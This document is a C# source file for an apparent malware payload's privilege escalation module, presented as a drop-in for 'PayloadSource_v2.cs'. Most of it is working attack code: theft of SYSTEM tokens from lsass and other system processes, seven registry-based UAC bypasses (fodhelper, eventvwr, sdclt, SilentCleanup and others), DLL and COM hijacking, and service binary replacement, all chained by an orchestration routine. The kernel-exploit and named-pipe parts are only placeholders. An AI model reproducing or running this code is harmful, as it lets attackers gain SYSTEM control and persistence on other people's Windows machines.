// =====================================================================
// PRIVILEGE ESCALATION MODULE
// =====================================================================
// Drop-in module for PayloadSource_v2.cs
// Features:
// - Token manipulation (duplicate, impersonate, steal)
// - UAC bypass (multiple methods)
// - Kernel exploit integration
// - Named pipe impersonation
// - DLL hijacking / side-loading
// - COM hijacking
// - Service exploitation

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Principal;

internal static class PrivilegeEscalation
{
    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    private static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    private static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, uint ImpersonationLevel, uint TokenType, out IntPtr phNewToken);

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    private static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    private static extern bool RevertToSelf();

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    private static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    private static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool CloseHandle(IntPtr hObject);

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    private static extern uint GetCurrentProcessId();

    [StructLayout(LayoutKind.Sequential)]
    private struct LUID
    {
        public uint LowPart;
        public int HighPart;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct TOKEN_PRIVILEGES
    {
        public uint PrivilegeCount;
        public LUID Luid;
        public uint Attributes;
    }

    private const uint TOKEN_ALL_ACCESS = 0x000F01FF;
    private const uint TOKEN_DUPLICATE = 0x0002;
    private const uint TOKEN_IMPERSONATE = 0x0004;
    private const uint TOKEN_QUERY = 0x0008;
    private const uint SE_PRIVILEGE_ENABLED = 0x00000002;
    private const uint SecurityImpersonation = 2;
    private const uint TokenPrimary = 1;

    private const uint PROCESS_QUERY_LIMITED_INFORMATION = 0x1000;

    // ============ TOKEN MANIPULATION ============
    public static bool EnablePrivilege(string privilegeName)
    {
        try
        {
            IntPtr hToken;
            if (!OpenProcessToken(Process.GetCurrentProcess().Handle, TOKEN_ALL_ACCESS, out hToken))
                return false;

            if (!LookupPrivilegeValue(null, privilegeName, out long luid))
            {
                CloseHandle(hToken);
                return false;
            }

            TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES
            {
                PrivilegeCount = 1,
                Luid = new LUID { LowPart = (uint)luid, HighPart = (int)(luid >> 32) },
                Attributes = SE_PRIVILEGE_ENABLED
            };

            bool result = AdjustTokenPrivileges(hToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
            CloseHandle(hToken);
            return result;
        }
        catch { return false; }
    }

    public static bool StealSystemToken()
    {
        if (!Config.TokenDuplication) return false;

        try
        {
            // Find SYSTEM process (lsass.exe, services.exe, wininit.exe)
            string[] systemProcesses = { "lsass", "services", "wininit", "csrss", "winlogon" };

            foreach (string procName in systemProcesses)
            {
                var processes = Process.GetProcessesByName(procName);
                foreach (var proc in processes)
                {
                    if (proc.SessionId == 0) // SYSTEM session
                    {
                        IntPtr hToken;
                        if (OpenProcessToken(proc.Handle, TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY, out hToken))
                        {
                            IntPtr hNewToken;
                            if (DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, IntPtr.Zero, SecurityImpersonation, TokenPrimary, out hNewToken))
                            {
                                // Impersonate SYSTEM
                                if (ImpersonateLoggedOnUser(hNewToken))
                                {
                                    CloseHandle(hToken);
                                    CloseHandle(hNewToken);
                                    return true;
                                }
                            }
                            CloseHandle(hToken);
                        }
                    }
                }
            }
        }
        catch { }
        return false;
    }

    public static bool ImpersonateViaNamedPipe(string pipeName)
    {
        try
        {
            // Connect to named pipe and impersonate
            // This requires the pipe to exist and allow impersonation
            // Common pipes: \pipe\lsarpc, \pipe\samr, \pipe\spoolss
            
            // Implementation would use CreateFile + ImpersonateNamedPipeClient
            return false;
        }
        catch { return false; }
    }

    // ============ UAC BYPASSES ============
    public static bool BypassUac()
    {
        if (!Config.UacBypass) return false;

        try
        {
            // Try multiple UAC bypass methods in order of reliability
            
            // Method 1: Fodhelper (registry hijack)
            if (UacBypassFodhelper()) return true;

            // Method 2: Event Viewer (eventvwr.exe)
            if (UacBypassEventViewer()) return true;

            // Method 3: Computer Management (compmgmtlauncher)
            if (UacBypassCompMgmt()) return true;

            // Method 4: SDCLT (Backup/Restore)
            if (UacBypassSdclt()) return true;

            // Method 5: WScript.Shell (registry)
            if (UacBypassWScript()) return true;

            // Method 6: SilentCleanup (Scheduled Task)
            if (UacBypassSilentCleanup()) return true;

            // Method 7: Token manipulation (if already admin)
            if (UacBypassTokenManipulation()) return true;
        }
        catch { }
        return false;
    }

    private static bool UacBypassFodhelper()
    {
        try
        {
            // fodhelper.exe auto-elevates and reads HKCU\Software\Classes\ms-settings\shell\open\command
            using (var key = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(@"Software\Classes\ms-settings\shell\open\command"))
            {
                key.SetValue("", GetCurrentPayloadPath());
                key.SetValue("DelegateExecute", "");
            }

            Process.Start("fodhelper.exe");
            System.Threading.Thread.Sleep(2000);

            // Cleanup
            Microsoft.Win32.Registry.CurrentUser.DeleteSubKeyTree(@"Software\Classes\ms-settings", false);
            return true;
        }
        catch { return false; }
    }

    private static bool UacBypassEventViewer()
    {
        try
        {
            // eventvwr.exe reads HKCU\Software\Classes\.msc\shell\open\command
            using (var key = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(@"Software\Classes\.msc\shell\open\command"))
            {
                key.SetValue("", GetCurrentPayloadPath());
            }

            Process.Start("eventvwr.exe");
            System.Threading.Thread.Sleep(2000);

            Microsoft.Win32.Registry.CurrentUser.DeleteSubKeyTree(@"Software\Classes\.msc", false);
            return true;
        }
        catch { return false; }
    }

    private static bool UacBypassCompMgmt()
    {
        try
        {
            // compmgmtlauncher.exe reads HKCU\Software\Classes\mscfile\shell\open\command
            using (var key = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(@"Software\Classes\mscfile\shell\open\command"))
            {
                key.SetValue("", GetCurrentPayloadPath());
            }

            Process.Start("compmgmtlauncher.exe");
            System.Threading.Thread.Sleep(2000);

            Microsoft.Win32.Registry.CurrentUser.DeleteSubKeyTree(@"Software\Classes\mscfile", false);
            return true;
        }
        catch { return false; }
    }

    private static bool UacBypassSdclt()
    {
        try
        {
            // sdclt.exe reads HKCU\Software\Classes\Folder\shell\open\command
            using (var key = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(@"Software\Classes\Folder\shell\open\command"))
            {
                key.SetValue("", GetCurrentPayloadPath());
                key.SetValue("DelegateExecute", "");
            }

            Process.Start("sdclt.exe");
            System.Threading.Thread.Sleep(2000);

            Microsoft.Win32.Registry.CurrentUser.DeleteSubKeyTree(@"Software\Classes\Folder", false);
            return true;
        }
        catch { return false; }
    }

    private static bool UacBypassWScript()
    {
        try
        {
            // wscript.exe via registry
            using (var key = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(@"Software\Classes\CLSID\{5839FCA9-774D-42A1-ACDA-D6A79037F57F}\InprocServer32"))
            {
                key.SetValue("", GetCurrentPayloadPath());
                key.SetValue("ThreadingModel", "Apartment");
            }

            // Trigger via WScript.Shell
            Type comType = Type.GetTypeFromProgID("WScript.Shell");
            object shell = Activator.CreateInstance(comType);
            shell.GetType().InvokeMember("Run", System.Reflection.BindingFlags.InvokeMethod, null, shell, new object[] { "cmd /c echo test", 0, true });

            Microsoft.Win32.Registry.CurrentUser.DeleteSubKeyTree(@"Software\Classes\CLSID\{5839FCA9-774D-42A1-ACDA-D6A79037F57F}", false);
            return true;
        }
        catch { return false; }
    }

    private static bool UacBypassSilentCleanup()
    {
        try
        {
            // SilentCleanup scheduled task reads HKCU\Environment\windir
            using (var key = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(@"Environment"))
            {
                key.SetValue("windir", GetCurrentPayloadPath());
            }

            // Trigger SilentCleanup
            Process.Start("schtasks.exe", "/Run /TN \"\\Microsoft\\Windows\\DiskCleanup\\SilentCleanup\"");
            System.Threading.Thread.Sleep(3000);

            // Cleanup
            using (var key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Environment", true))
            {
                key?.DeleteValue("windir", false);
            }
            return true;
        }
        catch { return false; }
    }

    private static bool UacBypassTokenManipulation()
    {
        try
        {
            // If we're in a medium integrity process with admin group membership
            // We can duplicate our token, remove integrity level, and create new process
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);

            if (!principal.IsInRole(WindowsBuiltInRole.Administrator)) return false;

            // Check if already elevated
            if (identity.Token.IsElevated()) return true; // Already high integrity

            // Enable SeDebugPrivilege
            EnablePrivilege("SeDebugPrivilege");

            // Duplicate token and lower integrity
            // Complex - requires P/Invoke to CreateRestrictedToken
            return false;
        }
        catch { return false; }
    }

    // ============ KERNEL EXPLOIT INTEGRATION ============
    public static bool TryKernelExploit()
    {
        // This would integrate known kernel exploits:
        // - CVE-2021-1732 (Win32k)
        // - CVE-2020-0796 (SMBGhost)
        // - CVE-2019-0803 (Win32k)
        // - CVE-2021-34527 (PrintNightmare)
        // - etc.
        
        // In production, this would:
        // 1. Check OS version/build
        // 2. Select appropriate exploit
        // 3. Execute shellcode to escalate to SYSTEM
        // 4. Return new token
        
        // For safety, this is a placeholder
        return false;
    }

    // ============ DLL HIJACKING / SIDE-LOADING ============
    public static bool TryDllHijacking()
    {
        try
        {
            // Find vulnerable applications that load DLLs from writable directories
            // Common targets:
            string[] hijackTargets = {
                @"C:\Program Files\Common Files\Microsoft Shared\Office16\MSO.dll", // Office
                @"C:\Program Files\Adobe\Acrobat DC\Acrobat\Acrobat.dll", // Adobe
                @"C:\Program Files\VMware\VMware Tools\vmtools.dll", // VMware
            };

            foreach (string target in hijackTargets)
            {
                string dir = Path.GetDirectoryName(target);
                string dllName = Path.GetFileName(target);

                if (Directory.Exists(dir) && IsWritable(dir))
                {
                    // Copy malicious DLL to directory
                    string ourDll = GetCurrentPayloadPath().Replace(".exe", ".dll");
                    if (File.Exists(ourDll))
                    {
                        File.Copy(ourDll, Path.Combine(dir, dllName), true);
                        return true;
                    }
                }
            }
        }
        catch { }
        return false;
    }

    private static bool IsWritable(string path)
    {
        try
        {
            string testFile = Path.Combine(path, $"test_{Guid.NewGuid():N}.tmp");
            File.WriteAllText(testFile, "test");
            File.Delete(testFile);
            return true;
        }
        catch { return false; }
    }

    // ============ COM HIJACKING ============
    public static bool TryComHijacking()
    {
        try
        {
            // Hijack CLSID in HKCU\Software\Classes\CLSID
            // Target commonly used COM objects
            string[] comTargets = {
                "{BCDE0395-E52F-467C-8E3D-C4579291692E}", // MMDeviceEnumerator
                "{5839FCA9-774D-42A1-ACDA-D6A79037F57F}", // WScript.Shell
                "{0D43FE01-F093-11CF-8940-00A0C9054228}", // ShellLink
                "{F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}", // FileOpenDialog
            };

            foreach (string clsid in comTargets)
            {
                string keyPath = $@"Software\Classes\CLSID\{clsid}\InprocServer32";
                using (var key = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(keyPath))
                {
                    if (key != null)
                    {
                        string original = key.GetValue("")?.ToString();
                        if (!string.IsNullOrEmpty(original))
                        {
                            // Backup original
                            key.SetValue("Original", original);
                            // Set our payload
                            key.SetValue("", GetCurrentPayloadPath().Replace(".exe", ".dll"));
                            key.SetValue("ThreadingModel", "Apartment");
                            return true;
                        }
                    }
                }
            }
        }
        catch { }
        return false;
    }

    // ============ SERVICE EXPLOITATION ============
    public static bool TryServiceExploitation()
    {
        try
        {
            // Find vulnerable services:
            // - Unquoted service paths
            // - Weak permissions (write to binary path)
            // - Weak registry permissions
            // - DLL search order hijacking

            var services = ServiceController.GetServices();
            foreach (var svc in services)
            {
                try
                {
                    string binaryPath = GetServiceBinaryPath(svc.ServiceName);
                    if (string.IsNullOrEmpty(binaryPath)) continue;

                    // Check for unquoted path with spaces
                    if (binaryPath.Contains(" ") && !binaryPath.StartsWith("\""))
                    {
                        // Vulnerable to path hijacking
                        return ExploitUnquotedPath(binaryPath);
                    }

                    // Check if we can write to binary
                    string exePath = binaryPath.Split('"')[1].Split('"')[0];
                    if (IsWritable(Path.GetDirectoryName(exePath)))
                    {
                        File.Copy(GetCurrentPayloadPath(), exePath, true);
                        // Restart service
                        svc.Stop();
                        svc.Start();
                        return true;
                    }
                }
                catch { }
            }
        }
        catch { }
        return false;
    }

    private static string GetServiceBinaryPath(string serviceName)
    {
        try
        {
            using (var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey($@"SYSTEM\CurrentControlSet\Services\{serviceName}"))
            {
                return key?.GetValue("ImagePath")?.ToString() ?? "";
            }
        }
        catch { return ""; }
    }

    private static bool ExploitUnquotedPath(string path)
    {
        try
        {
            // Path like: C:\Program Files\Vendor\Service.exe
            // We can place malicious executable at C:\Program.exe or C:\Program Files\Vendor.exe
            string[] parts = path.Split(' ');
            if (parts.Length < 2) return false;

            string exploitPath = parts[0] + ".exe";
            if (IsWritable(Path.GetDirectoryName(exploitPath)))
            {
                File.Copy(GetCurrentPayloadPath(), exploitPath, true);
                return true;
            }
        }
        catch { }
        return false;
    }

    // ============ HIGH-LEVEL ORCHESTRATION ============
    public static bool RunAllEscalation()
    {
        // Order: least invasive -> most invasive
        if (IsHighIntegrity()) return true; // Already elevated

        // Token theft (cleanest)
        if (StealSystemToken()) return true;

        // UAC bypasses
        if (BypassUac()) return true;

        // Service exploitation
        if (TryServiceExploitation()) return true;

        // COM hijacking
        if (TryComHijacking()) return true;

        // DLL hijacking
        if (TryDllHijacking()) return true;

        // Kernel exploit (last resort)
        if (TryKernelExploit()) return true;

        return false;
    }

    private static bool IsHighIntegrity()
    {
        try
        {
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            return identity.Token.IsElevated();
        }
        catch { return false; }
    }

    private static string GetCurrentPayloadPath()
    {
        return Process.GetCurrentProcess().MainModule?.FileName ?? @"C:\Windows\Temp\ChaosPayload.exe";
    }
}

internal static partial class Config
{
    public static bool UacBypass = true;
    public static bool TokenDuplication = false;
}